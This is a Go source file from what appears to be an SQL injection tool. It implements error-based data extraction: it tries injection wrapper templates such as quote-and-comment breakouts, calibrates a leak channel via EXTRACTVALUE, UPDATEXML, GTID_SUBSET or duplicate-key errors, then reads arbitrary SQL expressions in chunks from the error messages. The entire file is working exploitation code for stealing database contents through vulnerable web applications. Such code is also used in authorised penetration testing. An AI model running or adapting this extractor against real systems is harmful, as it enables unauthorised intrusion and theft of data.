package enumeration

import (
	"context"
	"errors"
	"fmt"
	"strings"

	"github.com/0xseif-code/vexor/internal/sqli/dbms"
)

// errorProbeValue is a sentinel string echoed through the error channel during
// calibration to prove the point reflects error-based data back to us.
const errorProbeValue = "VEXORTEST"

// maxErrorChunks bounds the number of positional reads per value, protecting
// against runaway chunk loops on degenerate targets.
const maxErrorChunks = 32

// errorWrappers are the injection-context templates tried when the confirmed
// payload cannot be reused directly. {orig} is replaced with the original
// parameter value.
var errorWrappers = []struct{ prefix, suffix string }{
	{"{orig} AND ", "-- -"},
	{"{orig}' AND ", "-- -"},
	{`{orig}" AND `, "-- -"},
	{"{orig}) AND ", "-- -"},
	{"{orig}') AND ", "-- -"},
	{"{orig}' OR ", "-- -"},
}

// errorString reads an arbitrary SQL scalar expression through the error
// channel, positionally, in Chunk-sized pieces.
func (x *Extractor) errorString(ctx context.Context, expr string) (string, error) {
	if err := x.calibrateError(ctx); err != nil {
		return "", err
	}
	prefix, suffix, chunk, ok := x.errorFields()
	if !ok {
		return "", errors.New("error-based extraction channel unavailable")
	}
	var sb strings.Builder
	pos := 1
	for i := 0; i < maxErrorChunks; i++ {
		if ctx.Err() != nil {
			return "", ctx.Err()
		}
		valueExpr := "ifnull(substring((" + expr + ")," + itoa(int64(pos)) + "," + itoa(int64(chunk)) + "),'')"
		part, err := x.errorReadOnce(ctx, prefix, suffix, chunk, valueExpr)
		if err != nil {
			return "", err
		}
		if part == "" {
			break // value exhausted
		}
		sb.WriteString(part)
		if len(part) < chunk {
			break
		}
		pos += chunk
	}
	return sb.String(), nil
}

// errorReadOnce injects one expression and parses the leaked value from the
// provoked DBMS error.
func (x *Extractor) errorReadOnce(ctx context.Context, prefix, suffix string, chunk int, valueExpr string) (string, error) {
	payload := prefix + x.errChannel().Build(valueExpr) + suffix
	resp, err := x.send(ctx, payload)
	if err != nil {
		return "", err
	}
	val, ok := parseErrorValue(resp.Body, chunk)
	if !ok {
		return "", errors.New("no parseable value in DBMS error response (channel or injection context mismatch)")
	}
	return val, nil
}

// errorChannel returns the calibrated leak channel. Callers must have already
// run calibrateError.
func (x *Extractor) errChannel() *dbms.ErrorFn {
	x.errMut.Lock()
	defer x.errMut.Unlock()
	return x.errChan
}

// errorFields snapshots the calibrated channel state under the lock.
func (x *Extractor) errorFields() (prefix, suffix string, chunk int, ok bool) {
	x.errMut.Lock()
	prefix, suffix = x.errPrefix, x.errSuffix
	ch := x.errChan
	ok = x.errKnown
	x.errMut.Unlock()
	if !ok || ch == nil {
		return "", "", 0, false
	}
	return prefix, suffix, ch.Chunk, true
}

// calibrateError finds a working (prefix, suffix, channel) triple by first
// re-using the exact injection context of the confirmed error payload, then
// falling back to the generic wrapper families. The result is cached; a total
// failure permanently disables the error path so the blind engine takes over.
func (x *Extractor) calibrateError(ctx context.Context) error {
	x.errMut.Lock()
	defer x.errMut.Unlock()
	if x.errKnown || x.errBroken {
		return nil
	}

	// 1) Reuse the injection context present in the confirmed payload.
	if prefix, suffix, ok := deriveErrorPrefix(x.detPayload); ok {
		for i := range x.errChans {
			ch := &x.errChans[i]
			if probe := x.errorProbe(ctx, prefix, suffix, ch, ch.Build("'"+errorProbeValue+"'")); probe == errorProbeValue {
				x.errPrefix, x.errSuffix, x.errChan, x.errKnown = prefix, suffix, ch, true
				x.logChannel(ch.Name)
				return nil
			}
		}
	}

	// 2) Probe generic wrapper families against every channel.
	for _, w := range errorWrappers {
		prefix := strings.ReplaceAll(w.prefix, "{orig}", x.Original())
		for i := range x.errChans {
			ch := &x.errChans[i]
			if probe := x.errorProbe(ctx, prefix, w.suffix, ch, ch.Build("'"+errorProbeValue+"'")); probe == errorProbeValue {
				x.errPrefix, x.errSuffix, x.errChan, x.errKnown = prefix, w.suffix, ch, true
				x.logChannel(ch.Name)
				return nil
			}
		}
	}

	x.errBroken = true
	return fmt.Errorf(
		"error-based extraction unavailable: no payload echoed a value back (raw DBMS error observed: %q); falling back to blind extraction",
		x.LastErrorSnippet(),
	)
}

// errorProbe injects a probe expression and returns the leaked value, or ""
// when nothing was reflected.
func (x *Extractor) errorProbe(ctx context.Context, prefix, suffix string, ch *dbms.ErrorFn, probe string) string {
	resp, err := x.send(ctx, prefix+probe+suffix)
	if err != nil {
		return ""
	}
	val, ok := parseErrorValue(resp.Body, ch.Chunk)
	if !ok {
		return ""
	}
	return val
}

// logChannel reports the activated channel to the progress stream.
func (x *Extractor) logChannel(name string) {
	reportProgress(x.progress, "[extract] error-based channel: %s", name)
}

// deriveErrorPrefix extracts the injection context surrounding the confirmed
// error payload so new expressions can reuse the exact quoting / parens /
// comment suffix that detection proved works.
//
// The channel expression inside the payload is found by locating the first
// known error-channel token. For the scalar function channels
// (EXTRACTVALUE/UPDATEXML/GTID_SUBSET) the expression starts at the function
// call. For the duplicate-key channel (SELECT COUNT(*) ... GROUP BY x) the
// expression is the whole enclosing "(SELECT 1 FROM (SELECT COUNT(*)...)...)" —
// the token sits inside nested parens, so the outer opening paren that
// actually contains it is located via a paren stack instead. The matching
// close paren is then found by balancing, giving a suffix of "-- -" / "#" or
// whatever comment terminator the payload already carries.
func deriveErrorPrefix(payload string) (prefix, suffix string, ok bool) {
	up := strings.ToUpper(payload)
	idx := -1
	tok := ""
	for _, k := range []string{"EXTRACTVALUE(", "UPDATEXML(", "GTID_SUBSET(", "SELECT COUNT(*)"} {
		if i := strings.Index(up, k); i >= 0 && (idx < 0 || i < idx) {
			idx, tok = i, k
		}
	}
	if idx < 0 {
		return "", "", false
	}
	exprStart := idx
	if tok == "SELECT COUNT(*)" {
		// The duplicate-key channel wraps its value in a derived table whose
		// whole expression begins at the outermost "(SELECT" that still
		// contains the COUNT(*) token.
		if open := outerOpenParen(payload, idx); open >= 0 {
			exprStart = open
		}
	}
	prefix = payload[:exprStart]
	if strings.TrimSpace(prefix) == "" {
		return "", "", false
	}
	end := matchingCloseParen(payload, exprStart)
	if end < 0 || end >= len(payload) {
		return "", "", false
	}
	suffix = payload[end+1:]
	if strings.TrimSpace(suffix) == "" {
		suffix = "-- -"
	}
	return prefix, suffix, true
}

// outerOpenParen returns the index of the outermost '(' that encloses position
// idx, or -1 when idx is inside no parens. It walks forward maintaining a
// paren stack; the outermost open still on the stack at idx is the first one
// pushed that has not been closed yet.
func outerOpenParen(s string, idx int) int {
	var stack []int
	for i := 0; i <= idx; i++ {
		switch s[i] {
		case '(':
			stack = append(stack, i)
		case ')':
			if len(stack) > 0 {
				stack = stack[:len(stack)-1]
			}
		}
	}
	if len(stack) == 0 {
		return -1
	}
	return stack[0]
}

// matchingCloseParen returns the index of the ')' that balances the '(' at
// start, or -1 when unbalanced.
func matchingCloseParen(s string, start int) int {
	depth := 0
	for i := start; i < len(s); i++ {
		switch s[i] {
		case '(':
			depth++
		case ')':
			depth--
			if depth == 0 {
				return i
			}
		}
	}
	return -1
}

// parseErrorValue extracts the value leaked inside a DBMS error message. It
// accepts any response that either carries a known DBMS error signature or a
// concrete leak token (XPATH syntax error, Duplicate entry, ...), so an app
// that prints the raw MySQL error without a framework banner still works. The
// duplicate-key channel is parsed separately because MySQL suffixes the
// row-id fragment after the closing delimiter. A parsed-but-empty value
// reports ok=true, distinguishing "end of data" from "no leak".
func parseErrorValue(body []byte, max int) (string, bool) {
	if len(body) == 0 {
		return "", false
	}
	_, ev := dbms.MatchError(body)
	if ev == "" && !hasErrorLeakSignal(body) {
		return "", false
	}
	s := string(body)

	// Duplicate-key channel: "Duplicate entry '~~<value>~~<rowid>' for key".
	if val, ok := parseDuplicateEntry(s, max); ok {
		return val, true
	}

	// Localize to a window around the error signal so page-body quotes and
	// tildes do not interfere.
	sigIdx := signalIndex(s, ev)
	if sigIdx < 0 {
		sigIdx = 0
	}
	lead := 0
	if sigIdx > 80 {
		lead = sigIdx - 80
	}
	win := s[lead:]
	end := len(win)
	if sigIdx-lead+512 < end {
		end = sigIdx - lead + 512
	}
	if end > len(win) {
		end = len(win)
	}
	win = win[:end]

	i := strings.IndexByte(win, '~')
	if i < 0 {
		return "", false
	}
	// Close the delimiter pair: support both "~~value~~" and "~value~".
	start := i
	for start < len(win) && win[start] == '~' {
		start++
	}
	// Skip an opening quote placed immediately before the value (some DBMSes
	// emit a quoted value before the closing delimiter).
	if start < len(win) && win[start] == '\'' {
		start++
	}
	j := start
	for j < len(win) && win[j] != '~' && win[j] != '\'' && (j-start) < max {
		j++
	}
	if j > start && j-start > max {
		j = start + max
	}
	return win[start:j], true
}

// hasErrorLeakSignal reports whether the body contains a token that a verbose
// error channel would emit, independent of how the application frames it.
func hasErrorLeakSignal(body []byte) bool {
	s := strings.ToLower(string(body))
	for _, kw := range errorSignalWords {
		if strings.Contains(s, kw) {
			return true
		}
	}
	return false
}

// errorSignalWords are the message families emitted by the supported error
// channels. They are intentionally broad enough to cover raw driver output
// (e.g. just "XPATH syntax error: '~value~'") from any framing.
var errorSignalWords = []string{
	"xpath syntax error", "duplicate entry", "extractvalue", "updatexml",
	"syntax error", "you have an error", "sqlstate", "out of range",
	"data truncated", "malformed", "gtid", "floor(rand", "name_const",
	"unterminated quoted string", "invalid input syntax", "no such column",
	"sql logic error", "operator does not exist", "incorrect syntax near",
	"query failed", "pg_query", "oracle error",
}

// signalIndex returns the byte offset of the most reliable error indicator in
// the body: the DBMS signature snippet when present, otherwise the earliest
// leak keyword occurrence.
func signalIndex(s, ev string) int {
	if ev != "" {
		if i := strings.Index(s, ev); i >= 0 {
			return i
		}
	}
	low := strings.ToLower(s)
	best := -1
	for _, kw := range errorSignalWords {
		if i := strings.Index(low, kw); i >= 0 && (best < 0 || i < best) {
			best = i
		}
	}
	return best
}

// parseDuplicateEntry extracts the value kept between the "~~" delimiters in a
// MySQL "Duplicate entry '~~value~~rowid' for key ..." message.
func parseDuplicateEntry(s string, max int) (string, bool) {
	marker := "Duplicate entry '"
	idx := strings.Index(s, marker)
	if idx < 0 {
		return "", false
	}
	rest := s[idx+len(marker):]
	// Accept both the classic "~~value~~" double-tilde framing used by the
	// floor/rand channel and a plain quoted value with no leak delimiters
	// (which is not ours).
	if first := strings.Index(rest, "~~"); first >= 0 {
		valStart := first + 2
		second := strings.Index(rest[valStart:], "~~")
		if second >= 0 {
			val := rest[valStart : valStart+second]
			if len(val) > max {
				val = val[:max]
			}
			return val, true
		}
		// Opening delimiter without a closing pair: fall through to empty.
		return "", true
	}
	return "", false
}
